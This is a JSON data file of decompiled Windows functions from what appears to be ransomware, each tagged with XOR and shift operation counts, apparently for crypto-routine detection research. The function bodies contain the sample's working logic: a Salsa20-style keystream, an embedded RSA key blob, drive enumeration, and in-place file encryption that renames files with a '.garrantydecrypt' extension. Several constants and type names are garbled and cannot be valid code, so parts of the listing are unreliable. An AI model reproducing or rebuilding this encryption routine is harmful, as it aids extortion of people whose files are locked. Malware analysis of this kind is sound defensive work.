[
    {
        "Function": "sub_40BD8A",
        "Total XOR and shift operations": 35,
        "XOR operations": 0,
        "Shift operations": 35,
        "Operation percentage": "47.30%",
        "Function Body": "\nunsigned int __usercall sub_40BD8A@<eax>(unsigned __int8 *a1@<eax>, int a2, int a3, int a4)\n{\n  int v4; // edx\n  int v5; // ecx\n  int v6; // edx\n  int v7; // esi\n  int v8; // edx\n  int v9; // ecx\n  int v10; // edx\n  int v11; // ecx\n  int v12; // edx\n  int v13; // ecx\n  int v14; // edx\n  unsigned int result; // eax\n  int v16[16]; // [esp+4h] [ebp-80h] BYREF\n  int v17[16]; // [esp+44h] [ebp-40h] BYREF\n\n  v17[0] = salsa20_403F27 | ((byte_4071CB | ((byte_40D36B | (byte_402D2E << 8)) << 8)) << 8);\n  v17[1] = *a1 | ((a1[1] | (*((unsigned __int16 *)a1 + 1) << 8)) << 8);\n  v4 = a1[10];\n  v17[2] = a1[4] | ((a1[5] | (*((unsigned __int16 *)a1 + 3) << 8)) << 8);\n  v5 = a1[8] | ((a1[9] | ((v4 | (a1[11] << 8)) << 8)) << 8);\n  v6 = a1[14];\n  v17[3] = v5;\n  v17[4] = a1[12] | ((a1[13] | ((v6 | (a1[15] << 8)) << 8)) << 8);\n  v17[5] = byte_402251 | ((byte_40594D | ((byte_40BF4A | (byte_40DDF1 << 8)) << 8)) << 8);\n  v17[8] = a3;\n  v17[9] = a4;\n  v7 = 0;\n  v17[6] = -556AB2242;\n  v17[7] = 0;\n  v8 = a1[18];\n  v17[10] = byte_40C7B9 | ((byte_402F37 | ((byte_4080D5 | (byte_40E8DB << 8)) << 8)) << 8);\n  v9 = a1[16] | ((a1[17] | ((v8 | (a1[19] << 8)) << 8)) << 8);\n  v10 = a1[22];\n  v17[11] = v9;\n  v11 = a1[20] | ((a1[21] | ((v10 | (a1[23] << 8)) << 8)) << 8);\n  v12 = a1[26];\n  v17[12] = v11;\n  v13 = a1[24] | ((a1[25] | ((v12 | (a1[27] << 8)) << 8)) << 8);\n  v14 = a1[30];\n  v17[13] = v13;\n  v17[14] = a1[28] | ((a1[29] | ((v14 | (a1[31] << 8)) << 8)) << 8);\n  v17[15] = byte_40413F | ((byte_403EC1 | ((byte_4013D7 | (byte_404AAB << 8)) << 8)) << 8);\n  sub_40CFE6(v16, (int)v17);\n  do\n  {\n    result = (unsigned int)v16[v7 / 4] >> (8 * (v7 % 4));\n    *(_BYTE *)(v7 + a2) = result;\n    ++v7;\n  }\n  while ( v7 < 64 );\n  return result;\n}\n// 403F27: using guessed type char salsa20_403F27;\n// 4071CB: using guessed type char byte_4071CB;\n// 40D36B: using guessed type char byte_40D36B;\n// 402D2E: using guessed type char byte_402D2E;\n// 402251: using guessed type char byte_402251;\n// 40594D: using guessed type char byte_40594D;\n// 40BF4A: using guessed type char byte_40BF4A;\n// 40DDF1: using guessed type char byte_40DDF1;\n// 40C7B9: using guessed type char byte_40C7B9;\n// 402F37: using guessed type char byte_402F37;\n// 4080D5: using guessed type char byte_4080D5;\n// 40E8DB: using guessed type char byte_40E8DB;\n// 40413F: using guessed type char byte_40413F;\n// 403EC1: using guessed type char byte_403EC1;\n// 4013D7: using guessed type char byte_4013D7;\n// 404AAB: using guessed type char byte_404AAB;\n// 40BD8A: using guessed type int var_80[16];\n\n"
    },
    {
        "Function": "sub_40CFE6",
        "Total XOR and shift operations": 32,
        "XOR operations": 32,
        "Shift operations": 0,
        "Operation percentage": "32.00%",
        "Function Body": "\nint __cdecl sub_40CFE6(int *a1, int a2)\n{\n  int i; // ecx\n  int v3; // eax\n  int v4; // edx\n  int v5; // edx\n  int v6; // ecx\n  int v7; // eax\n  int v8; // esi\n  int v9; // eax\n  int v10; // ecx\n  int v11; // edx\n  int v12; // esi\n  int *v13; // ecx\n  int v14; // edi\n  int result; // eax\n  int v16; // [esp+0h] [ebp-44h]\n  int v17; // [esp+4h] [ebp-40h]\n  int v18; // [esp+8h] [ebp-3Ch]\n  int v19; // [esp+Ch] [ebp-38h]\n  int v20; // [esp+10h] [ebp-34h]\n  int v21; // [esp+14h] [ebp-30h]\n  int v22; // [esp+18h] [ebp-2Ch]\n  int v23; // [esp+1Ch] [ebp-28h]\n  int v24; // [esp+20h] [ebp-24h]\n  int v25; // [esp+24h] [ebp-20h]\n  int v26; // [esp+28h] [ebp-1Ch]\n  int v27; // [esp+2Ch] [ebp-18h]\n  int v28; // [esp+30h] [ebp-14h]\n  int v29; // [esp+34h] [ebp-10h]\n  int v30; // [esp+38h] [ebp-Ch]\n  int v31; // [esp+3Ch] [ebp-8h]\n  int v32; // [esp+40h] [ebp-4h]\n\n  for ( i = 0; i < 16; ++i )\n  {\n    v3 = i % 4 + 4 * (i / 4);\n    v4 = *(_DWORD *)(a2 + 4 * i);\n    *(&v16 + v3) = v4;\n  }\n  v5 = v28;\n  v6 = v24;\n  v7 = v20;\n  v8 = v16;\n  v32 = 10;\n  do\n  {\n    v9 = __ROL4__(v8 + v5, 7) ^ v7;\n    v10 = __ROL4__(v9 + v8, 9) ^ v6;\n    v11 = __ROL4__(v10 + v9, 13) ^ v5;\n    v12 = __ROR4__(v10 + v11, 14) ^ v8;\n    v25 ^= __ROL4__(v17 + v21, 7);\n    v29 ^= __ROL4__(v21 + v25, 9);\n    v17 ^= __ROL4__(v25 + v29, 13);\n    v21 ^= __ROR4__(v17 + v29, 14);\n    v30 ^= __ROL4__(v22 + v26, 7);\n    v18 ^= __ROL4__(v26 + v30, 9);\n    v22 ^= __ROL4__(v30 + v18, 13);\n    v26 ^= __ROR4__(v22 + v18, 14);\n    v19 ^= __ROL4__(v27 + v31, 7);\n    v23 ^= __ROL4__(v31 + v19, 9);\n    v27 ^= __ROL4__(v19 + v23, 13);\n    v31 ^= __ROR4__(v27 + v23, 14);\n    v17 ^= __ROL4__(v12 + v19, 7);\n    v18 ^= __ROL4__(v12 + v17, 9);\n    v19 ^= __ROL4__(v17 + v18, 13);\n    v8 = __ROR4__(v18 + v19, 14) ^ v12;\n    v22 ^= __ROL4__(v9 + v21, 7);\n    v23 ^= __ROL4__(v21 + v22, 9);\n    v7 = __ROL4__(v22 + v23, 13) ^ v9;\n    v21 ^= __ROR4__(v7 + v23, 14);\n    v27 ^= __ROL4__(v25 + v26, 7);\n    v6 = __ROL4__(v26 + v27, 9) ^ v10;\n    v25 ^= __ROL4__(v6 + v27, 13);\n    v26 ^= __ROR4__(v6 + v25, 14);\n    v5 = __ROL4__(v30 + v31, 7) ^ v11;\n    v29 ^= __ROL4__(v5 + v31, 9);\n    v30 ^= __ROL4__(v5 + v29, 13);\n    v31 ^= __ROR4__(v29 + v30, 14);\n    --v32;\n  }\n  while ( v32 );\n  v16 = v8;\n  v24 = v6;\n  v13 = a1;\n  v14 = 0;\n  v28 = v5;\n  v20 = v7;\n  do\n  {\n    result = *(int *)((char *)v13 + a2 - (_DWORD)a1) + *(&v16 + 4 * (v14 / 4) + v14 % 4);\n    ++v14;\n    *v13++ = result;\n  }\n  while ( v14 < 16 );\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_40669B",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "4.62%",
        "Function Body": "\n_BYTE *__usercall sub_40669B@<eax>(int a1@<eax>, int a2@<ecx>)\n{\n  int v2; // ebx\n  _BYTE *v4; // esi\n  unsigned int v5; // edi\n  unsigned int i; // edx\n  char v7; // cl\n  unsigned int v8; // edx\n  char v9; // cl\n  char v10; // cl\n  _BYTE *v12; // [esp+Ch] [ebp-Ch]\n  int v13; // [esp+10h] [ebp-8h]\n  char v14[2]; // [esp+14h] [ebp-4h] BYREF\n  unsigned __int8 v15; // [esp+16h] [ebp-2h]\n\n  v2 = a1;\n  v4 = sub_40F1FF(4 * ((a1 + 2) / 3u) + 1);\n  v12 = v4;\n  if ( v4 )\n  {\n    if ( v2 )\n    {\n      v13 = a2 - (_DWORD)v14;\n      do\n      {\n        v5 = 0;\n        for ( i = 0; i < 3; ++i )\n        {\n          if ( v2 )\n          {\n            --v2;\n            ++v5;\n            v14[i] = v14[i + v13];\n          }\n          else\n          {\n            v14[i] = 0;\n          }\n        }\n        v7 = v14[0];\n        v8 = (unsigned __int8)v14[1];\n        v13 += 3;\n        *v4 = BA2C03_table_4015AE[(unsigned __int8)v14[0] >> 2];\n        v4[1] = BA2C03_table_4015AE[(16 * (v7 & 3)) | (v8 >> 4)];\n        if ( v5 <= 1 )\n          v9 = 61;\n        else\n          v9 = BA2C03_table_4015AE[(4 * (v8 & 0xF)) | (v15 >> 6)];\n        v4[2] = v9;\n        if ( v5 <= 2 )\n          v10 = 61;\n        else\n          v10 = BA2C03_table_4015AE[v15 & 0x3F];\n        v4[3] = v10;\n        v4 += 4;\n      }\n      while ( v2 );\n    }\n    *v4 = 0;\n  }\n  return v12;\n}\n\n"
    },
    {
        "Function": "sub_403AD9",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "3.95%",
        "Function Body": "\n_BYTE *__usercall sub_403AD9@<eax>(int a1@<eax>, _DWORD *a2)\n{\n  const CHAR *v3; // eax\n  _BYTE *v4; // esi\n  int v5; // edi\n  int i; // edx\n  char v7; // cl\n  unsigned __int8 v8; // cl\n  int j; // ecx\n  _BYTE *v11; // [esp+4h] [ebp-10h]\n  char v12; // [esp+8h] [ebp-Ch]\n  unsigned __int8 v13; // [esp+9h] [ebp-Bh]\n  unsigned __int8 v14; // [esp+Ah] [ebp-Ah]\n  char v15; // [esp+Bh] [ebp-9h]\n  const CHAR *v16; // [esp+Ch] [ebp-8h]\n  char v17[4]; // [esp+10h] [ebp-4h]\n\n  v11 = sub_40F1FF(a1 + 1);\n  if ( v11 )\n  {\n    v3 = &String[a1];\n    v4 = v11;\n    v16 = \"BgIAAACkAA47FCExAB7080EAAQAfUDvrYL7lF1XhXKge33E2EBA33gYy0ZDOhsWwBJ4D54cSFWvgrgQmosvTFpr4r8AM3zW8414cOdDL2407nE\"\n          \"UOXADx/fwMxGj0Lp+gxl/qg3kKzBSAoqSA+nqyvZtgpjCyQIDIu1FAE1CSkWz8QusTTWl7k5hbf49hgnZUYRDlM+H/YQ5898gA9oCrqzfpk7dn\"\n          \"RjcVGvQbqZeqCLF8PkT5sTXX8uNdXAjXAMqTVcypFHuJP8351mjku7nYXC9C0gseq1IynsjDVLY+XEu9JJ8qt5WvYR/Vsm0Q54TuzUcqiLOZdq\"\n          \"vR/jntTD9OAbtIk88fjh5Am0wLNXWlMqsN0TbzPSPkDZAC87iCi3uIXblUFRaTuLsj3aAlJmixgXqqYGidWTNUoXG1E74eM9CdwKL4tF6+B3oT\"\n          \"0zYe4xMxuW+LubuQCWh7I4B0ClqaPDBKBtYLhStq2yvW653jn2fx84pCRM+VPuqbIdyo0lOz3W2318xRKNbQWA2D7DL9b/yU+LhIX468BE19Y8\"\n          \"u6rf8bJlqwUsIJNjSEHg0KsIQg4W1qrt7uhJCtMX1+dqDCaimWuYM/hguQ7C2C7DeeOei/RhvYLe4L2cn9hQ1FQTc1VcReoRBhdU1hRKE08Aes\"\n          \"ndxPdOsYje1UhuP+qy/RyP958PdtPs7u5ttzWNckR4pgN3uTnQ==\";\n    while ( v16 < v3 )\n    {\n      v5 = 0;\n      for ( i = 0; i < 4; ++i )\n      {\n        if ( v16 >= v3 )\n          break;\n        v7 = 0;\n        while ( !v7 )\n        {\n          v8 = *v16++;\n          if ( (unsigned __int8)(v8 - 43) > 0x4Fu )\n            v7 = 0;\n          else\n            v7 = *((_BYTE *)&byte_40CF4F + v8 + 1);\n          if ( v7 )\n            v7 = (v7 - 61) & ((v7 == 36) - 1);\n          if ( v16 >= v3 )\n          {\n            if ( !v7 )\n              goto LABEL_15;\n            break;\n          }\n        }\n        ++v5;\n        *(&v12 + i) = v7 - 1;\nLABEL_15:\n        ;\n      }\n      if ( v5 )\n      {\n        v17[0] = (4 * v12) | (v13 >> 4);\n        v17[1] = (16 * v13) | (v14 >> 2);\n        v17[2] = v15 | (v14 << 6);\n        for ( j = 0; j < v5 - 1; ++j )\n          *v4++ = v17[j];\n      }\n    }\n    *v4 = 0;\n    if ( a2 )\n      *a2 = v4 - v11;\n  }\n  return v11;\n}\n\n"
    },
    {
        "Function": "sub_408FCD",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "3.70%",
        "Function Body": "\nvoid sub_408FCD()\n{\n  int v0; // esi\n  DWORD LogicalDrives; // ebx\n  int v2; // edi\n  WCHAR pszDest[260]; // [esp+10h] [ebp-208h] BYREF\n\n  sub_4040EE(0);\n  v0 = 65;\n  LogicalDrives = GetLogicalDrives();\n  v2 = 26;\n  do\n  {\n    if ( (LogicalDrives & 1) != 0 )\n    {\n      wnsprintfW(pszDest, 260, L\"\\\\\\\\?\\\\%c:\", v0);\n      sub_40F8F4((int)pszDest);\n    }\n    LogicalDrives >>= 1;\n    ++v0;\n    --v2;\n  }\n  while ( v2 );\n}\n\n"
    },
    {
        "Function": "sub_403F5A",
        "Total XOR and shift operations": 3,
        "XOR operations": 1,
        "Shift operations": 2,
        "Operation percentage": "2.36%",
        "Function Body": "\nvoid __cdecl sub_403F5A(LP20CCR lpFileName)\n{\n  int v1; // edi\n  void *v2; // eax\n  _BYTE *v3; // esi\n  const WCHAR *v4; // eax\n  const WCHAR *v5; // eax\n  void *v6; // eax\n  LPD72A v7; // eax\n  int v8; // ecx\n  WCHAR *v9; // eax\n  WCHAR *v10; // esi\n  const WCHAR *v11; // [esp-4h] [ebp-A8h]\n  char v12[68]; // [esp+10h] [ebp-94h] BYREF\n  BYTE pbBuffer[32]; // [esp+54h] [ebp-50h] BYREF\n  DWORD v14; // [esp+74h] [ebp-30h]\n  DWORD pdwDataLen; // [esp+7Ch] [ebp-28h] BYREF\n  int v16; // [esp+80h] [ebp-24h]\n  int Buffer; // [esp+84h] [ebp-20h] BYREF\n  int v18; // [esp+88h] [ebp-1Ch]\n  LP7ECED v19; // [esp+8Ch] [ebp-18h]\n  LPD72A lpBuffer; // [esp+90h] [ebp-14h]\n  DWORD NumberOfBytesRead; // [esp+94h] [ebp-10h] BYREF\n  HA9128 hFile; // [esp+98h] [ebp-Ch]\n  int v23; // [esp+9Ch] [ebp-8h]\n\n  v1 = 32;\n  if ( CryptGenRandom(hProv, 0x20u, pbBuffer) )\n  {\n    v2 = sub_40F1FF(48);\n    v19 = v2;\n    if ( v2 )\n    {\n      pdwDataLen = 32;\n      v3 = v2;\n      do\n      {\n        *v3 = v3[pbBuffer - (_BYTE *)v2];\n        ++v3;\n        --v1;\n      }\n      while ( v1 );\n      CryptEncrypt(phKey, 0, 1, 0, (BYTE *)v2, &pdwDataLen, 0x30u);\n      hFile = CreateFileW(lpFileName, 0xC0865F00, 1u, 0, 3u, 0x80u, 0);\n      if ( hFile != (HA9128)-1 )\n      {\n        v18 = 0;\n        v23 = 0;\n        while ( 1 )\n        {\n          v4 = &lpFileName[lstrlenW(lpFileName)];\n          do\n            --v4;\n          while ( *v4 != 92 );\n          v5 = StrStrW(\n                 &lpFileName[((char *)v4 - (char *)lpFileName + 2) >> 1],\n                 *(wchar_t **)((char *)&off_40D271 + v23));\n          if ( v5 )\n          {\n            v6 = (void *)lstrlenW(v5);\n            v11 = *(wchar_t **)((char *)&off_40D271 + v23);\n            lpBuffer = v6;\n            v7 = (LPD72A)lstrlenW(v11);\n            if ( lpBuffer == v7 )\n              break;\n          }\n          v23 += 4;\n          if ( (unsigned int)v23 >= 4 )\n            goto LABEL_14;\n        }\n        v18 = 1;\nLABEL_14:\n        lpBuffer = sub_40F1FF(10240);\n        if ( lpBuffer )\n        {\n          do\n          {\n            ReadFile(hFile, lpBuffer, 0x2800u, &NumberOfBytesRead, 0);\n            v14 = NumberOfBytesRead;\n            v23 = 0;\n            if ( NumberOfBytesRead )\n            {\n              do\n              {\n                v8 = v23 & 0x3F;\n                v16 = v8;\n                if ( (v23 & 0x80ABAE3F) == 0 )\n                {\n                  sub_40BD8A(pbBuffer, (int)v12, v23 / 64, (v23 / 64) >> 31);\n                  v8 = v16;\n                }\n                *((_BYTE *)lpBuffer + v23++) ^= v12[v8];\n              }\n              while ( v23 >= 0 && v23 < v14 );\n            }\n            SetFilePointerEx(hFile, (LARGE_INED8CR)-NumberOfBytesRead, 0, 1u);\n            WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesRead, 0);\n          }\n          while ( v18 && NumberOfBytesRead == 10240 );\n          sub_4012FC(lpBuffer);\n        }\n        Buffer = -74A5D6289;\n        SetFilePointerEx(hFile, 0i64, 0, 2u);\n        WriteFile(hFile, &Buffer, 4u, &NumberOfBytesRead, 0);\n        WriteFile(hFile, v19, 0x30u, &NumberOfBytesRead, 0);\n        CloseHandle(hFile);\n        v9 = (WCHAR *)sub_40F1FF(65534);\n        v10 = v9;\n        if ( v9 )\n        {\n          wnsprintfW(v9, 0x7FFF, L\"%s%s\", lpFileName, L\".garrantydecrypt\");\n          MoveFileW(lpFileName, v10);\n          sub_4012FC(v10);\n        }\n      }\n      sub_4012FC((LPD72A)v19);\n    }\n  }\n}\n// 4012CA: conditional instruction was optimized away because %var_8.4>=0\n// 40152D: mask 0x80ABAE3F is shortened because %var_8.4 <= 0x7F36E9FF\n// 4044D9: using guessed type wchar_t aGarrantydecryp[17];\n// 40D271: using guessed type wchar_t *off_40D271;\n// 403F5A: using guessed type char var_94[68];\n\n"
    },
    {
        "Function": "sub_402911",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nHC9C67KEY sub_402911()\n{\n  HC9C67PROV v0; // esi\n  int v1; // eax\n  BYTE *v2; // edi\n  DWORD dwDataLen; // [esp+8h] [ebp-8h] BYREF\n  HC9C67KEY phKey; // [esp+Ch] [ebp-4h] BYREF\n\n  phKey = 0;\n  v0 = hProv;\n  v1 = lstrlenA(\n         \"BgIAAACkAA47FCExAB7080EAAQAfUDvrYL7lF1XhXKge33E2EBA33gYy0ZDOhsWwBJ4D54cSFWvgrgQmosvTFpr4r8AM3zW8414cOdDL2407nEU\"\n         \"OXADx/fwMxGj0Lp+gxl/qg3kKzBSAoqSA+nqyvZtgpjCyQIDIu1FAE1CSkWz8QusTTWl7k5hbf49hgnZUYRDlM+H/YQ5898gA9oCrqzfpk7dnRj\"\n         \"cVGvQbqZeqCLF8PkT5sTXX8uNdXAjXAMqTVcypFHuJP8351mjku7nYXC9C0gseq1IynsjDVLY+XEu9JJ8qt5WvYR/Vsm0Q54TuzUcqiLOZdqvR/\"\n         \"jntTD9OAbtIk88fjh5Am0wLNXWlMqsN0TbzPSPkDZAC87iCi3uIXblUFRaTuLsj3aAlJmixgXqqYGidWTNUoXG1E74eM9CdwKL4tF6+B3oT0zYe\"\n         \"4xMxuW+LubuQCWh7I4B0ClqaPDBKBtYLhStq2yvW653jn2fx84pCRM+VPuqbIdyo0lOz3W2318xRKNbQWA2D7DL9b/yU+LhIX468BE19Y8u6rf8\"\n         \"bJlqwUsIJNjSEHg0KsIQg4W1qrt7uhJCtMX1+dqDCaimWuYM/hguQ7C2C7DeeOei/RhvYLe4L2cn9hQ1FQTc1VcReoRBhdU1hRKE08AesndxPdO\"\n         \"sYje1UhuP+qy/RyP958PdtPs7u5ttzWNckR4pgN3uTnQ==\");\n  v2 = sub_403AD9(v1, &dwDataLen);\n  if ( v2 )\n  {\n    CryptImportKey(v0, v2, dwDataLen, 0, 0, &phKey);\n    sub_4012FC(v2);\n  }\n  return phKey;\n}\n\n"
    },
    {
        "Function": "sub_406253",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\n_DWORD *sub_406253()\n{\n  _DWORD *v0; // esi\n  BYTE *v1; // eax\n  int v2; // eax\n  _BYTE *v3; // eax\n  DWORD v4; // edx\n  BYTE *v5; // ecx\n  int v6; // eax\n  _BYTE *v7; // eax\n  DWORD v8; // edi\n  BYTE *v9; // ecx\n  DWORD v11; // [esp+4h] [ebp-10h]\n  HC9C67KEY phKey; // [esp+8h] [ebp-Ch] BYREF\n  BYTE *pbData; // [esp+Ch] [ebp-8h]\n  DWORD pdwDataLen; // [esp+10h] [ebp-4h] BYREF\n\n  v0 = 0;\n  if ( CryptGenKey(hProv, 0xA400u, 0x18520E1u, &phKey) )\n  {\n    v0 = sub_40F1FF(8);\n    v1 = (BYTE *)sub_40F1FF(384);\n    pbData = v1;\n    if ( v1 )\n    {\n      pdwDataLen = 384;\n      if ( CryptExportKey(phKey, 0, 6u, 0, v1, &pdwDataLen) )\n      {\n        v2 = pdwDataLen;\n        v0[2] = pdwDataLen;\n        v3 = sub_40F1FF(v2);\n        v4 = pdwDataLen;\n        *v0 = v3;\n        if ( v4 )\n        {\n          v5 = (BYTE *)(pbData - v3);\n          v11 = v4;\n          do\n          {\n            *v3 = v3[(_DWORD)v5];\n            ++v3;\n            --v11;\n          }\n          while ( v11 );\n        }\n      }\n      pdwDataLen = 384;\n      if ( CryptExportKey(phKey, 0, 7u, 0, pbData, &pdwDataLen) )\n      {\n        v6 = pdwDataLen;\n        v0[3] = pdwDataLen;\n        v7 = sub_40F1FF(v6);\n        v8 = pdwDataLen;\n        v0[1] = v7;\n        if ( v8 )\n        {\n          v9 = (BYTE *)(pbData - v7);\n          do\n          {\n            *v7 = v7[(_DWORD)v9];\n            ++v7;\n            --v8;\n          }\n          while ( v8 );\n        }\n      }\n      sub_4012FC(pbData);\n    }\n    CryptDestroyKey(phKey);\n  }\n  return v0;\n}\n\n"
    },
    {
        "Function": "sub_40F1FF",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nLPD72A __usercall sub_40F1FF@<eax>(int a1@<eax>)\n{\n  HA9128 ProcessHeap; // eax\n  SIZE_T v3; // [esp-4h] [ebp-4h]\n\n  v3 = a1 + 64;\n  ProcessHeap = GetProcessHeap();\n  return HeapAlloc(ProcessHeap, 8u, v3);\n}\n\n"
    },
    {
        "Function": "sub_4012FC",
        "Total XOR and shift operations": 0,
        "XOR operations": 0,
        "Shift operations": 0,
        "Operation percentage": "0.00%",
        "Function Body": "\nvoid __cdecl sub_4012FC(LPD72A lpMem)\n{\n  HA9128 ProcessHeap; // eax\n\n  if ( lpMem )\n  {\n    ProcessHeap = GetProcessHeap();\n    HeapFree(ProcessHeap, 0, lpMem);\n  }\n}\n\n"
    }
]